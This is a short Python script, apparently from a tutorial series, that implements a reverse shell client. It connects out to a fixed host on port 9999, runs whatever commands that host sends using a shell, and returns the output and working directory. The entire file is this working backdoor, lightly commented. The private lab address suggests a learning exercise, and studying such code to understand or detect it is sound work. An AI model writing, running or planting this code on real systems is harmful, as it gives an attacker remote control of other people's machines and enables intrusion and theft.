#!/usr/bin/python3

# ref https://www.youtube.com/watch?v=Iu8_IpztiOU&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF&index=16

import socket
import os
import subprocess

PORT = 9999
SERVER = "192.168.92.128"
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'

client_sock = socket.socket()
client_sock.connect(ADDR)

while True:
    # Set receive buffer to 1024 bytes
    # Receive sent data using recv.
    data = client_sock.recv(1024)
    # Decode first to chars, to detect if cd command is being sent.
    # If so, slice remaining characters (3:) to use in remainder of
    # cd command.
    if data[:2].decode(FORMAT) == 'cd':
        os.chdir(data[3:].decode(FORMAT))
    
    # If any other command than cd is typed, execute that command
    # in a new process using Popen.
    if len(data) > 0:
        # Shell equals true gives you access to shell commands, allowing
        # you to type in the entire command as if you were on a shell.
        cmd = subprocess.Popen(data[:].decode(FORMAT), shell=True,
        stdout=subprocess.PIPE, stdin=subprocess.PIPE,
        stderr=subprocess.PIPE)

        # The next two lines along with the print below, prints to the 
        # clients computer.
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, FORMAT)
        # Appends $ to server command prompt.
        cwd = os.getcwd() + "$ "
        # Send output from commands ran on client back to server.
        client_sock.send(str.encode(output_str + cwd))

        # Prints output on client computer.
        print(output_str)